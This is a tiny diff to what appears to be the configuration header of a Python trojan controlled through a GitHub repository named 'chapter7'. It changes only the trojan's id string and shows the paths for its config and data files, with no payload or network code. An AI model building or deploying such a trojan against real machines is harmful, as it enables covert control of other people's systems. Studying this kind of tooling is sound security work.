@@ -10,7 +10,7 @@ REPOSITORY = 'chapter7'
 BRANCH = 'master'
 ######################################
 
-trojan_id = "abd"  # unique id for this trojan
+trojan_id = "abc"  # unique id for this trojan
 relative_path = ""
 trojan_config = relative_path + "config/{0}.json".format(trojan_id)
 data_path = relative_path + "data/{0}/".format(trojan_id)
